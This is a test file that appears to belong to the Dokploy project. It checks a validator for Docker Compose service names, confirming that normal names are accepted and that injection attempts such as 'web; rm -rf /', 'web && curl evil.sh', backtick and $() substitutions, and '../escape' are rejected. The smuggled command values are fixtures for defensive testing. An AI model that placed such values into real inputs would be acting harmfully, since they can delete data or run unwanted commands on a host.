import { isValidComposeServiceName } from "@dokploy/server/services/compose-service";
import { describe, expect, it } from "vitest";

describe("compose service name validation", () => {
	it.each(["web", "api-1", "db_primary", "worker.2", "Redis"])(
		"accepts %s",
		(name) => {
			expect(isValidComposeServiceName(name)).toBe(true);
		},
	);

	it.each([
		"",
		"-leading-dash",
		"web; rm -rf /",
		"web && curl evil.sh",
		"web`whoami`",
		"web$(id)",
		"web|tee",
		"web\nrm -rf /",
		"web service",
		"../escape",
	])("rejects %j", (name) => {
		expect(isValidComposeServiceName(name)).toBe(false);
	});

	it("bounds the length", () => {
		expect(isValidComposeServiceName("a".repeat(129))).toBe(false);
		expect(isValidComposeServiceName("a".repeat(128))).toBe(true);
	});
});
